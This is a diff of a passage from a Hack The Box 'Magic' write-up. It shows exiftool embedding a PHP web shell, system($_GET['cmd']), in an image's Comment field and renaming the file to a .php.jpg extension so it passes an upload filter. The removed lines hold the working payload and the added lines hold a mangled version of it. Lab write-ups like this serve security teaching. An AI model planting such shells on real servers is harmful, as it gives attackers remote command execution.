@@ -86,10 +86,10 @@ I found the locations where these images are saving.
 
 We can use Exiftool to inject payload into an image.
 
-> exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' payload.jpg
+> exiftool -Comment='[?php echo "<pre](?php echo "<pre)"; system($_GET['cmd']); ?>' payload.jpg
 
 ```bash
-root@w0lf:~/CTF/HTB/Boxes/Magic# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' payload.jpg
+root@w0lf:~/CTF/HTB/Boxes/Magic# exiftool -Comment='[?php echo "<pre](?php echo "<pre)"; system($_GET['cmd']); ?>' payload.jpg
     1 image files updated
 root@w0lf:~/CTF/HTB/Boxes/Magic# mv payload.jpg payload.php.jpg
 ```
